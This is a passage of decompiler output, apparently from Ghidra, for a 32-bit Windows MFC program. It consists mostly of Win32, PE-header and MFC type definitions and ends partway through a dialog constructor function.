typedef unsigned char   undefined;

typedef unsigned long long    GUID;
typedef pointer32 ImageBaseOffset32;

typedef unsigned char    bool;
typedef unsigned char    byte;
typedef unsigned int    dword;
typedef long long    longlong;
typedef unsigned char    uchar;
typedef unsigned int    uint;
typedef unsigned long    ulong;
typedef unsigned char    undefined1;
typedef unsigned short    undefined2;
typedef unsigned int    undefined4;
typedef unsigned long long    undefined8;
typedef unsigned short    ushort;
typedef unsigned short    wchar16;
typedef unsigned short    word;
typedef struct _s_HandlerType _s_HandlerType, *P_s_HandlerType;

typedef struct _s_HandlerType HandlerType;

typedef struct TypeDescriptor TypeDescriptor, *PTypeDescriptor;

typedef int ptrdiff_t;

struct TypeDescriptor {
    dword hash;
    void *spare;
    char name[0];
};

struct _s_HandlerType {
    uint adjectives;
    struct TypeDescriptor *pType;
    ptrdiff_t dispCatchObj;
    void *addressOfHandler;
};

typedef struct CLIENT_ID CLIENT_ID, *PCLIENT_ID;

struct CLIENT_ID {
    void *UniqueProcess;
    void *UniqueThread;
};

typedef struct _s_UnwindMapEntry _s_UnwindMapEntry, *P_s_UnwindMapEntry;

typedef struct _s_UnwindMapEntry UnwindMapEntry;

typedef int __ehstate_t;

struct _s_UnwindMapEntry {
    __ehstate_t toState;
    void (*action)(void);
};

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct {
    dword OffsetToDirectory;
    dword DataIsDirectory;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion {
    dword OffsetToData;
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryStruct;
};

typedef struct _s_TryBlockMapEntry _s_TryBlockMapEntry, *P_s_TryBlockMapEntry;

struct _s_TryBlockMapEntry {
    __ehstate_t tryLow;
    __ehstate_t tryHigh;
    __ehstate_t catchHigh;
    int nCatches;
    HandlerType *pHandlerArray;
};

typedef struct _s_FuncInfo _s_FuncInfo, *P_s_FuncInfo;

typedef struct _s_FuncInfo FuncInfo;

typedef struct _s_TryBlockMapEntry TryBlockMapEntry;

struct _s_FuncInfo {
    uint magicNumber_and_bbtFlags;
    __ehstate_t maxState;
    UnwindMapEntry *pUnwindMap;
    uint nTryBlocks;
    TryBlockMapEntry *pTryBlockMap;
    uint nIPMapEntries;
    void *pIPToStateMap;
};

typedef struct HWND__ HWND__, *PHWND__;

typedef struct HWND__ *HWND;

typedef uint UINT;

typedef uint UINT_PTR;

typedef ulong DWORD;

typedef void (*TIMERPROC)(HWND, UINT, UINT_PTR, DWORD);

struct HWND__ {
    int unused;
};

typedef struct SERVICE_STATUS_HANDLE__ SERVICE_STATUS_HANDLE__, *PSERVICE_STATUS_HANDLE__;

typedef struct SERVICE_STATUS_HANDLE__ *SERVICE_STATUS_HANDLE;

struct SERVICE_STATUS_HANDLE__ {
    int unused;
};

typedef struct _SERVICE_TABLE_ENTRYA _SERVICE_TABLE_ENTRYA, *P_SERVICE_TABLE_ENTRYA;

typedef struct _SERVICE_TABLE_ENTRYA SERVICE_TABLE_ENTRYA;

typedef char CHAR;

typedef CHAR *LPSTR;

typedef void (*LPSERVICE_MAIN_FUNCTIONA)(DWORD, LPSTR *);

struct _SERVICE_TABLE_ENTRYA {
    LPSTR lpServiceName;
    LPSERVICE_MAIN_FUNCTIONA lpServiceProc;
};

typedef struct _SERVICE_STATUS _SERVICE_STATUS, *P_SERVICE_STATUS;

struct _SERVICE_STATUS {
    DWORD dwServiceType;
    DWORD dwCurrentState;
    DWORD dwControlsAccepted;
    DWORD dwWin32ExitCode;
    DWORD dwServiceSpecificExitCode;
    DWORD dwCheckPoint;
    DWORD dwWaitHint;
};

typedef struct SC_HANDLE__ SC_HANDLE__, *PSC_HANDLE__;

typedef struct SC_HANDLE__ *SC_HANDLE;

struct SC_HANDLE__ {
    int unused;
};

typedef struct _SERVICE_STATUS *LPSERVICE_STATUS;

typedef void (*LPHANDLER_FUNCTION)(DWORD);

typedef struct _SYSTEM_INFO _SYSTEM_INFO, *P_SYSTEM_INFO;

typedef struct _SYSTEM_INFO *LPSYSTEM_INFO;

typedef union _union_530 _union_530, *P_union_530;

typedef void *LPVOID;

typedef ulong ULONG_PTR;

typedef ULONG_PTR DWORD_PTR;

typedef ushort WORD;

typedef struct _struct_531 _struct_531, *P_struct_531;

struct _struct_531 {
    WORD wProcessorArchitecture;
    WORD wReserved;
};

union _union_530 {
    DWORD dwOemId;
    struct _struct_531 s;
};

struct _SYSTEM_INFO {
    union _union_530 u;
    DWORD dwPageSize;
    LPVOID lpMinimumApplicationAddress;
    LPVOID lpMaximumApplicationAddress;
    DWORD_PTR dwActiveProcessorMask;
    DWORD dwNumberOfProcessors;
    DWORD dwProcessorType;
    DWORD dwAllocationGranularity;
    WORD wProcessorLevel;
    WORD wProcessorRevision;
};

typedef struct _OVERLAPPED _OVERLAPPED, *P_OVERLAPPED;

typedef union _union_518 _union_518, *P_union_518;

typedef void *HANDLE;

typedef struct _struct_519 _struct_519, *P_struct_519;

typedef void *PVOID;

struct _struct_519 {
    DWORD Offset;
    DWORD OffsetHigh;
};

union _union_518 {
    struct _struct_519 s;
    PVOID Pointer;
};

struct _OVERLAPPED {
    ULONG_PTR Internal;
    ULONG_PTR InternalHigh;
    union _union_518 u;
    HANDLE hEvent;
};

typedef struct _SECURITY_ATTRIBUTES _SECURITY_ATTRIBUTES, *P_SECURITY_ATTRIBUTES;

typedef int BOOL;

struct _SECURITY_ATTRIBUTES {
    DWORD nLength;
    LPVOID lpSecurityDescriptor;
    BOOL bInheritHandle;
};

typedef struct _SYSTEMTIME _SYSTEMTIME, *P_SYSTEMTIME;

struct _SYSTEMTIME {
    WORD wYear;
    WORD wMonth;
    WORD wDayOfWeek;
    WORD wDay;
    WORD wHour;
    WORD wMinute;
    WORD wSecond;
    WORD wMilliseconds;
};

typedef struct _WIN32_FIND_DATAA _WIN32_FIND_DATAA, *P_WIN32_FIND_DATAA;

typedef struct _FILETIME _FILETIME, *P_FILETIME;

typedef struct _FILETIME FILETIME;

struct _FILETIME {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
};

struct _WIN32_FIND_DATAA {
    DWORD dwFileAttributes;
    FILETIME ftCreationTime;
    FILETIME ftLastAccessTime;
    FILETIME ftLastWriteTime;
    DWORD nFileSizeHigh;
    DWORD nFileSizeLow;
    DWORD dwReserved0;
    DWORD dwReserved1;
    CHAR cFileName[260];
    CHAR cAlternateFileName[14];
};

typedef struct _OVERLAPPED *LPOVERLAPPED;

typedef struct _SECURITY_ATTRIBUTES *LPSECURITY_ATTRIBUTES;

typedef struct _STARTUPINFOA _STARTUPINFOA, *P_STARTUPINFOA;

typedef uchar BYTE;

typedef BYTE *LPBYTE;

struct _STARTUPINFOA {
    DWORD cb;
    LPSTR lpReserved;
    LPSTR lpDesktop;
    LPSTR lpTitle;
    DWORD dwX;
    DWORD dwY;
    DWORD dwXSize;
    DWORD dwYSize;
    DWORD dwXCountChars;
    DWORD dwYCountChars;
    DWORD dwFillAttribute;
    DWORD dwFlags;
    WORD wShowWindow;
    WORD cbReserved2;
    LPBYTE lpReserved2;
    HANDLE hStdInput;
    HANDLE hStdOutput;
    HANDLE hStdError;
};

typedef struct _PROCESS_INFORMATION _PROCESS_INFORMATION, *P_PROCESS_INFORMATION;

struct _PROCESS_INFORMATION {
    HANDLE hProcess;
    HANDLE hThread;
    DWORD dwProcessId;
    DWORD dwThreadId;
};

typedef struct _WIN32_FIND_DATAA *LPWIN32_FIND_DATAA;

typedef struct _STARTUPINFOA *LPSTARTUPINFOA;

typedef struct _PROCESS_INFORMATION *LPPROCESS_INFORMATION;

typedef struct _RTL_CRITICAL_SECTION _RTL_CRITICAL_SECTION, *P_RTL_CRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION *PRTL_CRITICAL_SECTION;

typedef PRTL_CRITICAL_SECTION LPCRITICAL_SECTION;

typedef struct _RTL_CRITICAL_SECTION_DEBUG _RTL_CRITICAL_SECTION_DEBUG, *P_RTL_CRITICAL_SECTION_DEBUG;

typedef struct _RTL_CRITICAL_SECTION_DEBUG *PRTL_CRITICAL_SECTION_DEBUG;

typedef long LONG;

typedef struct _LIST_ENTRY _LIST_ENTRY, *P_LIST_ENTRY;

typedef struct _LIST_ENTRY LIST_ENTRY;

struct _RTL_CRITICAL_SECTION {
    PRTL_CRITICAL_SECTION_DEBUG DebugInfo;
    LONG LockCount;
    LONG RecursionCount;
    HANDLE OwningThread;
    HANDLE LockSemaphore;
    ULONG_PTR SpinCount;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    WORD Type;
    WORD CreatorBackTraceIndex;
    struct _RTL_CRITICAL_SECTION *CriticalSection;
    LIST_ENTRY ProcessLocksList;
    DWORD EntryCount;
    DWORD ContentionCount;
    DWORD Flags;
    WORD CreatorBackTraceIndexHigh;
    WORD SpareWORD;
};

typedef struct _SYSTEMTIME *LPSYSTEMTIME;

typedef struct _MEMORY_BASIC_INFORMATION _MEMORY_BASIC_INFORMATION, *P_MEMORY_BASIC_INFORMATION;

typedef ULONG_PTR SIZE_T;

struct _MEMORY_BASIC_INFORMATION {
    PVOID BaseAddress;
    PVOID AllocationBase;
    DWORD AllocationProtect;
    SIZE_T RegionSize;
    DWORD State;
    DWORD Protect;
    DWORD Type;
};

typedef struct _CONTEXT _CONTEXT, *P_CONTEXT;

typedef struct _CONTEXT CONTEXT;

typedef struct _FLOATING_SAVE_AREA _FLOATING_SAVE_AREA, *P_FLOATING_SAVE_AREA;

typedef struct _FLOATING_SAVE_AREA FLOATING_SAVE_AREA;

struct _FLOATING_SAVE_AREA {
    DWORD ControlWord;
    DWORD StatusWord;
    DWORD TagWord;
    DWORD ErrorOffset;
    DWORD ErrorSelector;
    DWORD DataOffset;
    DWORD DataSelector;
    BYTE RegisterArea[80];
    DWORD Cr0NpxState;
};

struct _CONTEXT {
    DWORD ContextFlags;
    DWORD Dr0;
    DWORD Dr1;
    DWORD Dr2;
    DWORD Dr3;
    DWORD Dr6;
    DWORD Dr7;
    FLOATING_SAVE_AREA FloatSave;
    DWORD SegGs;
    DWORD SegFs;
    DWORD SegEs;
    DWORD SegDs;
    DWORD Edi;
    DWORD Esi;
    DWORD Ebx;
    DWORD Edx;
    DWORD Ecx;
    DWORD Eax;
    DWORD Ebp;
    DWORD Eip;
    DWORD SegCs;
    DWORD EFlags;
    DWORD Esp;
    DWORD SegSs;
    BYTE ExtendedRegisters[512];
};

typedef struct _EXCEPTION_RECORD _EXCEPTION_RECORD, *P_EXCEPTION_RECORD;

typedef struct _EXCEPTION_RECORD EXCEPTION_RECORD;

typedef EXCEPTION_RECORD *PEXCEPTION_RECORD;

struct _EXCEPTION_RECORD {
    DWORD ExceptionCode;
    DWORD ExceptionFlags;
    struct _EXCEPTION_RECORD *ExceptionRecord;
    PVOID ExceptionAddress;
    DWORD NumberParameters;
    ULONG_PTR ExceptionInformation[15];
};

typedef enum _SECURITY_IMPERSONATION_LEVEL {
    SecurityAnonymous=0,
    SecurityIdentification=1,
    SecurityImpersonation=2,
    SecurityDelegation=3
} _SECURITY_IMPERSONATION_LEVEL;

typedef struct _TOKEN_PRIVILEGES _TOKEN_PRIVILEGES, *P_TOKEN_PRIVILEGES;

typedef struct _LUID_AND_ATTRIBUTES _LUID_AND_ATTRIBUTES, *P_LUID_AND_ATTRIBUTES;

typedef struct _LUID_AND_ATTRIBUTES LUID_AND_ATTRIBUTES;

typedef struct _LUID _LUID, *P_LUID;

typedef struct _LUID LUID;

struct _LUID {
    DWORD LowPart;
    LONG HighPart;
};

struct _LUID_AND_ATTRIBUTES {
    LUID Luid;
    DWORD Attributes;
};

struct _TOKEN_PRIVILEGES {
    DWORD PrivilegeCount;
    LUID_AND_ATTRIBUTES Privileges[1];
};

typedef CHAR *LPCSTR;

typedef struct _LUID *PLUID;

typedef long HRESULT;

typedef struct _MEMORY_BASIC_INFORMATION *PMEMORY_BASIC_INFORMATION;

typedef enum _SECURITY_IMPERSONATION_LEVEL SECURITY_IMPERSONATION_LEVEL;

typedef enum _TOKEN_INFORMATION_CLASS {
    TokenUser=1,
    TokenGroups=2,
    TokenPrivileges=3,
    TokenOwner=4,
    TokenPrimaryGroup=5,
    TokenDefaultDacl=6,
    TokenSource=7,
    TokenType=8,
    TokenImpersonationLevel=9,
    TokenStatistics=10,
    TokenRestrictedSids=11,
    TokenSessionId=12,
    TokenGroupsAndPrivileges=13,
    TokenSessionReference=14,
    TokenSandBoxInert=15,
    TokenAuditPolicy=16,
    TokenOrigin=17,
    TokenElevationType=18,
    TokenLinkedToken=19,
    TokenElevation=20,
    TokenHasRestrictions=21,
    TokenAccessInformation=22,
    TokenVirtualizationAllowed=23,
    TokenVirtualizationEnabled=24,
    TokenIntegrityLevel=25,
    TokenUIAccess=26,
    TokenMandatoryPolicy=27,
    TokenLogonSid=28,
    MaxTokenInfoClass=29
} _TOKEN_INFORMATION_CLASS;

typedef enum _TOKEN_TYPE {
    TokenPrimary=1,
    TokenImpersonation=2
} _TOKEN_TYPE;

typedef enum _TOKEN_TYPE TOKEN_TYPE;

typedef CONTEXT *PCONTEXT;

typedef struct _TOKEN_PRIVILEGES *PTOKEN_PRIVILEGES;

typedef DWORD ACCESS_MASK;

typedef HANDLE *PHANDLE;

typedef enum _TOKEN_INFORMATION_CLASS TOKEN_INFORMATION_CLASS;

typedef struct IMAGE_DOS_HEADER IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

struct IMAGE_DOS_HEADER {
    char e_magic[2]; // Magic number
    word e_cblp; // Bytes of last page
    word e_cp; // Pages in file
    word e_crlc; // Relocations
    word e_cparhdr; // Size of header in paragraphs
    word e_minalloc; // Minimum extra paragraphs needed
    word e_maxalloc; // Maximum extra paragraphs needed
    word e_ss; // Initial (relative) SS value
    word e_sp; // Initial SP value
    word e_csum; // Checksum
    word e_ip; // Initial IP value
    word e_cs; // Initial (relative) CS value
    word e_lfarlc; // File address of relocation table
    word e_ovno; // Overlay number
    word e_res[4][4]; // Reserved words
    word e_oemid; // OEM identifier (for e_oeminfo)
    word e_oeminfo; // OEM information; e_oemid specific
    word e_res2[10][10]; // Reserved words
    dword e_lfanew; // File address of new exe header
    byte e_program[64]; // Actual DOS program
};

typedef ulong *PULONG_PTR;

typedef long LONG_PTR;

typedef struct _EXCEPTION_POINTERS _EXCEPTION_POINTERS, *P_EXCEPTION_POINTERS;

struct _EXCEPTION_POINTERS {
    PEXCEPTION_RECORD ExceptionRecord;
    PCONTEXT ContextRecord;
};

typedef int (*FARPROC)(void);

typedef struct HICON__ HICON__, *PHICON__;

struct HICON__ {
    int unused;
};

typedef struct HDC__ HDC__, *PHDC__;

typedef struct HDC__ *HDC;

struct HDC__ {
    int unused;
};

typedef struct tagRECT tagRECT, *PtagRECT;

struct tagRECT {
    LONG left;
    LONG top;
    LONG right;
    LONG bottom;
};

typedef struct HKEY__ HKEY__, *PHKEY__;

struct HKEY__ {
    int unused;
};

typedef UINT_PTR WPARAM;

typedef DWORD *LPDWORD;

typedef struct HKEY__ *HKEY;

typedef HKEY *PHKEY;

typedef LONG_PTR LRESULT;

typedef struct HINSTANCE__ HINSTANCE__, *PHINSTANCE__;

struct HINSTANCE__ {
    int unused;
};

typedef DWORD *PDWORD;

typedef struct tagRECT *LPRECT;

typedef LONG_PTR LPARAM;

typedef struct HICON__ *HICON;

typedef int *LPINT;

typedef void *LPCVOID;

typedef struct HINSTANCE__ *HINSTANCE;

typedef HINSTANCE HMODULE;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion;

typedef struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct, *PIMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;

struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct {
    dword NameOffset;
    dword NameIsString;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion {
    struct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct IMAGE_RESOURCE_DIRECTORY_ENTRY_NameStruct;
    dword Name;
    word Id;
};

union IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_NameUnion NameUnion;
    union IMAGE_RESOURCE_DIRECTORY_ENTRY_DirectoryUnion DirectoryUnion;
};

typedef struct IMAGE_OPTIONAL_HEADER32 IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;

typedef struct IMAGE_DATA_DIRECTORY IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

struct IMAGE_DATA_DIRECTORY {
    ImageBaseOffset32 VirtualAddress;
    dword Size;
};

struct IMAGE_OPTIONAL_HEADER32 {
    word Magic;
    byte MajorLinkerVersion;
    byte MinorLinkerVersion;
    dword SizeOfCode;
    dword SizeOfInitializedData;
    dword SizeOfUninitializedData;
    ImageBaseOffset32 AddressOfEntryPoint;
    ImageBaseOffset32 BaseOfCode;
    ImageBaseOffset32 BaseOfData;
    pointer32 ImageBase;
    dword SectionAlignment;
    dword FileAlignment;
    word MajorOperatingSystemVersion;
    word MinorOperatingSystemVersion;
    word MajorImageVersion;
    word MinorImageVersion;
    word MajorSubsystemVersion;
    word MinorSubsystemVersion;
    dword Win32VersionValue;
    dword SizeOfImage;
    dword SizeOfHeaders;
    dword CheckSum;
    word Subsystem;
    word DllCharacteristics;
    dword SizeOfStackReserve;
    dword SizeOfStackCommit;
    dword SizeOfHeapReserve;
    dword SizeOfHeapCommit;
    dword LoaderFlags;
    dword NumberOfRvaAndSizes;
    struct IMAGE_DATA_DIRECTORY DataDirectory[16];
};

typedef struct IMAGE_SECTION_HEADER IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;

typedef union Misc Misc, *PMisc;

typedef enum SectionFlags {
    IMAGE_SCN_TYPE_NO_PAD=8,
    IMAGE_SCN_RESERVED_0001=16,
    IMAGE_SCN_CNT_CODE=32,
    IMAGE_SCN_CNT_INITIALIZED_DATA=64,
    IMAGE_SCN_CNT_UNINITIALIZED_DATA=128,
    IMAGE_SCN_LNK_OTHER=256,
    IMAGE_SCN_LNK_INFO=512,
    IMAGE_SCN_RESERVED_0040=1024,
    IMAGE_SCN_LNK_REMOVE=2048,
    IMAGE_SCN_LNK_COMDAT=4096,
    IMAGE_SCN_GPREL=32768,
    IMAGE_SCN_MEM_16BIT=131072,
    IMAGE_SCN_MEM_PURGEABLE=131072,
    IMAGE_SCN_MEM_LOCKED=262144,
    IMAGE_SCN_MEM_PRELOAD=524288,
    IMAGE_SCN_ALIGN_1BYTES=1048576,
    IMAGE_SCN_ALIGN_2BYTES=2097152,
    IMAGE_SCN_ALIGN_4BYTES=3145728,
    IMAGE_SCN_ALIGN_8BYTES=4194304,
    IMAGE_SCN_ALIGN_16BYTES=5242880,
    IMAGE_SCN_ALIGN_32BYTES=6291456,
    IMAGE_SCN_ALIGN_64BYTES=7340032,
    IMAGE_SCN_ALIGN_128BYTES=8388608,
    IMAGE_SCN_ALIGN_256BYTES=9437184,
    IMAGE_SCN_ALIGN_512BYTES=10485760,
    IMAGE_SCN_ALIGN_1024BYTES=11534336,
    IMAGE_SCN_ALIGN_2048BYTES=12582912,
    IMAGE_SCN_ALIGN_4096BYTES=13631488,
    IMAGE_SCN_ALIGN_8192BYTES=14680064,
    IMAGE_SCN_LNK_NRELOC_OVFL=16777216,
    IMAGE_SCN_MEM_DISCARDABLE=33554432,
    IMAGE_SCN_MEM_NOT_CACHED=67108864,
    IMAGE_SCN_MEM_NOT_PAGED=134217728,
    IMAGE_SCN_MEM_SHARED=268435456,
    IMAGE_SCN_MEM_EXECUTE=536870912,
    IMAGE_SCN_MEM_READ=1073741824,
    IMAGE_SCN_MEM_WRITE=2147483648
} SectionFlags;

union Misc {
    dword PhysicalAddress;
    dword VirtualSize;
};

struct IMAGE_SECTION_HEADER {
    char Name[8];
    union Misc Misc;
    ImageBaseOffset32 VirtualAddress;
    dword SizeOfRawData;
    dword PointerToRawData;
    dword PointerToRelocations;
    dword PointerToLinenumbers;
    word NumberOfRelocations;
    word NumberOfLinenumbers;
    enum SectionFlags Characteristics;
};

typedef struct IMAGE_RESOURCE_DATA_ENTRY IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

struct IMAGE_RESOURCE_DATA_ENTRY {
    dword OffsetToData;
    dword Size;
    dword CodePage;
    dword Reserved;
};

typedef struct IMAGE_RESOURCE_DIRECTORY IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

struct IMAGE_RESOURCE_DIRECTORY {
    dword Characteristics;
    dword TimeDateStamp;
    word MajorVersion;
    word MinorVersion;
    word NumberOfNamedEntries;
    word NumberOfIdEntries;
};

typedef struct IMAGE_FILE_HEADER IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

struct IMAGE_FILE_HEADER {
    word Machine; // 332
    word NumberOfSections;
    dword TimeDateStamp;
    dword PointerToSymbolTable;
    dword NumberOfSymbols;
    word SizeOfOptionalHeader;
    word Characteristics;
};

typedef struct IMAGE_NT_HEADERS32 IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;

struct IMAGE_NT_HEADERS32 {
    char Signature[4];
    struct IMAGE_FILE_HEADER FileHeader;
    struct IMAGE_OPTIONAL_HEADER32 OptionalHeader;
};

typedef LONG LSTATUS;

typedef ACCESS_MASK REGSAM;

typedef uint uintptr_t;

typedef struct tagOFNA tagOFNA, *PtagOFNA;

typedef struct tagOFNA *LPOPENFILENAMEA;

typedef UINT_PTR (*LPOFNHOOKPROC)(HWND, UINT, WPARAM, LPARAM);

struct tagOFNA {
    DWORD lStructSize;
    HWND hwndOwner;
    HINSTANCE hInstance;
    LPCSTR lpstrFilter;
    LPSTR lpstrCustomFilter;
    DWORD nMaxCustFilter;
    DWORD nFilterIndex;
    LPSTR lpstrFile;
    DWORD nMaxFile;
    LPSTR lpstrFileTitle;
    DWORD nMaxFileTitle;
    LPCSTR lpstrInitialDir;
    LPCSTR lpstrTitle;
    DWORD Flags;
    WORD nFileOffset;
    WORD nFileExtension;
    LPCSTR lpstrDefExt;
    LPARAM lCustData;
    LPOFNHOOKPROC lpfnHook;
    LPCSTR lpTemplateName;
    void *pvReserved;
    DWORD dwReserved;
    DWORD FlagsEx;
};

typedef ushort u_short;

typedef struct sockaddr sockaddr, *Psockaddr;

struct sockaddr {
    u_short sa_family;
    char sa_data[14];
};

typedef UINT_PTR SOCKET;

typedef struct CRuntimeClass CRuntimeClass, *PCRuntimeClass;

struct CRuntimeClass { // PlaceHolder Structure
};

typedef struct CComboBox CComboBox, *PCComboBox;

struct CComboBox { // PlaceHolder Structure
};

typedef struct CPtrArray CPtrArray, *PCPtrArray;

struct CPtrArray { // PlaceHolder Structure
};

typedef struct CFile CFile, *PCFile;

struct CFile { // PlaceHolder Structure
};

typedef struct CWinThread CWinThread, *PCWinThread;

struct CWinThread { // PlaceHolder Structure
};

typedef struct AFX_MODULE_STATE AFX_MODULE_STATE, *PAFX_MODULE_STATE;

struct AFX_MODULE_STATE { // PlaceHolder Structure
};

typedef struct CDocument CDocument, *PCDocument;

struct CDocument { // PlaceHolder Structure
};

typedef struct CScrollBar CScrollBar, *PCScrollBar;

struct CScrollBar { // PlaceHolder Structure
};

typedef struct AFX_OLECMDMAP AFX_OLECMDMAP, *PAFX_OLECMDMAP;

struct AFX_OLECMDMAP { // PlaceHolder Structure
};

typedef struct CTypeLibCache CTypeLibCache, *PCTypeLibCache;

struct CTypeLibCache { // PlaceHolder Structure
};

typedef struct _GUID _GUID, *P_GUID;

struct _GUID { // PlaceHolder Structure
};

typedef struct CDataExchange CDataExchange, *PCDataExchange;

struct CDataExchange { // PlaceHolder Structure
};

typedef struct tagDRAWITEMSTRUCT tagDRAWITEMSTRUCT, *PtagDRAWITEMSTRUCT;

struct tagDRAWITEMSTRUCT { // PlaceHolder Structure
};

typedef struct AFX_EVENTSINKMAP AFX_EVENTSINKMAP, *PAFX_EVENTSINKMAP;

struct AFX_EVENTSINKMAP { // PlaceHolder Structure
};

typedef struct COccManager COccManager, *PCOccManager;

struct COccManager { // PlaceHolder Structure
};

typedef struct tagTOOLINFOA tagTOOLINFOA, *PtagTOOLINFOA;

struct tagTOOLINFOA { // PlaceHolder Structure
};

typedef struct tagDELETEITEMSTRUCT tagDELETEITEMSTRUCT, *PtagDELETEITEMSTRUCT;

struct tagDELETEITEMSTRUCT { // PlaceHolder Structure
};

typedef struct AFX_CMDHANDLERINFO AFX_CMDHANDLERINFO, *PAFX_CMDHANDLERINFO;

struct AFX_CMDHANDLERINFO { // PlaceHolder Structure
};

typedef struct AFX_CONNECTIONMAP AFX_CONNECTIONMAP, *PAFX_CONNECTIONMAP;

struct AFX_CONNECTIONMAP { // PlaceHolder Structure
};

typedef struct IUnknown IUnknown, *PIUnknown;

struct IUnknown { // PlaceHolder Structure
};

typedef struct CDialog CDialog, *PCDialog;

struct CDialog { // PlaceHolder Structure
};

typedef struct ITypeLib ITypeLib, *PITypeLib;

struct ITypeLib { // PlaceHolder Structure
};

typedef struct COleControlSite COleControlSite, *PCOleControlSite;

struct COleControlSite { // PlaceHolder Structure
};

typedef struct tagMEASUREITEMSTRUCT tagMEASUREITEMSTRUCT, *PtagMEASUREITEMSTRUCT;

struct tagMEASUREITEMSTRUCT { // PlaceHolder Structure
};

typedef struct tagVARIANT tagVARIANT, *PtagVARIANT;

struct tagVARIANT { // PlaceHolder Structure
};

typedef struct CWnd CWnd, *PCWnd;

struct CWnd { // PlaceHolder Structure
};

typedef struct CException CException, *PCException;

struct CException { // PlaceHolder Structure
};

typedef struct CCreateContext CCreateContext, *PCCreateContext;

struct CCreateContext { // PlaceHolder Structure
};

typedef struct CListCtrl CListCtrl, *PCListCtrl;

struct CListCtrl { // PlaceHolder Structure
};

typedef struct CFont CFont, *PCFont;

struct CFont { // PlaceHolder Structure
};

typedef struct tagCOMPAREITEMSTRUCT tagCOMPAREITEMSTRUCT, *PtagCOMPAREITEMSTRUCT;

struct tagCOMPAREITEMSTRUCT { // PlaceHolder Structure
};

typedef struct tagMSG tagMSG, *PtagMSG;

struct tagMSG { // PlaceHolder Structure
};

typedef struct CCmdTarget CCmdTarget, *PCCmdTarget;

struct CCmdTarget { // PlaceHolder Structure
};

typedef struct IConnectionPoint IConnectionPoint, *PIConnectionPoint;

struct IConnectionPoint { // PlaceHolder Structure
};

typedef struct AFX_DISPMAP AFX_DISPMAP, *PAFX_DISPMAP;

struct AFX_DISPMAP { // PlaceHolder Structure
};

typedef struct _AFX_OCC_DIALOG_INFO _AFX_OCC_DIALOG_INFO, *P_AFX_OCC_DIALOG_INFO;

struct _AFX_OCC_DIALOG_INFO { // PlaceHolder Structure
};

typedef struct CString CString, *PCString;

struct CString { // PlaceHolder Structure
};

typedef struct AFX_INTERFACEMAP AFX_INTERFACEMAP, *PAFX_INTERFACEMAP;

struct AFX_INTERFACEMAP { // PlaceHolder Structure
};

typedef struct tagCREATESTRUCTA tagCREATESTRUCTA, *PtagCREATESTRUCTA;

struct tagCREATESTRUCTA { // PlaceHolder Structure
};

typedef struct AFX_MSGMAP AFX_MSGMAP, *PAFX_MSGMAP;

struct AFX_MSGMAP { // PlaceHolder Structure
};

typedef struct CPaintDC CPaintDC, *PCPaintDC;

struct CPaintDC { // PlaceHolder Structure
};

typedef struct CWinApp CWinApp, *PCWinApp;

struct CWinApp { // PlaceHolder Structure
};

typedef struct CPoint CPoint, *PCPoint;

struct CPoint { // PlaceHolder Structure
};

typedef int (*_onexit_t)(void);

typedef uint size_t;

typedef struct _startupinfo _startupinfo, *P_startupinfo;

struct _startupinfo {
    int newmode;
};




undefined4 * FUN_00401000(void)

{
  HINSTANCE__ *hInstance;
  HICON pHVar1;
  undefined4 *this;
  int unaff_EBP;
  LPCSTR lpIconName;
  
  FUN_0040a1d0();
  *(undefined4 **)(unaff_EBP + -0x10) = this;
  CDialog::CDialog((CDialog *)this,0x82,*(CWnd **)(unaff_EBP + 8));
  *(undefined4 *)(unaff_EBP + -4) = 0;
  CWnd::CWnd((CWnd *)(this + 0x18));
  this[0x18] = &PTR_LAB_0040b7a0;
  *(undefined *)(unaff_EBP + -4) = 1;
  CWnd::CWnd((CWnd *)(this + 0x28));
  this[0x28] = &PTR_LAB_0040b7a0;
  *(undefined *)(unaff_EBP + -4) = 2;
  CWnd::CWnd((CWnd *)(this + 0x38));
  this[0x38] = &PTR_LAB_0040b6d0;
  *(undefined *)(unaff_EBP + -4) = 3;
  CWnd::CWnd((CWnd *)(this + 0x48));
  this[0x48] = &PTR_LAB_0040b6d0;
  *(undefined *)(unaff_EBP + -4) = 4;
  CString::CString((CString *)(this + 0x58));
